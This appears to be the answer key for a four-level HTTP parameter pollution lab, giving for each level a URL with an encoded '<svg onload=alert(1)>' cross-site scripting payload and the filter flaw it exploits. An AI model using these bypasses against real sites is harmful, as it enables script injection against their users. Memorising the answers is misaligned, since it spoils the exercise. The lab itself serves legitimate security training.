# hpp — solutions

HTTP parameter pollution: duplicate names, array suffixes, and dot-notation reflections.

### hpp-level1

`/hpp/level1/?query=%3Csvg%20onload%3Dalert(1)%3E&query=safe`

- payload: `<svg onload=alert(1)>` (first value)
- context: first value displayed, last value filter-checked

### hpp-level2

`/hpp/level2/?query=a&q=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>` in `q`
- context: query stripped of <>, q unfiltered

### hpp-level3

`/hpp/level3/?items%5B%5D=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>` in `items[]`
- context: array values wrapped in <li>, raw reflection

### hpp-level4

`/hpp/level4/?config.theme=red%22%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `red"><svg onload=alert(1)>`
- context: body style="background: QUERY" attribute breakout
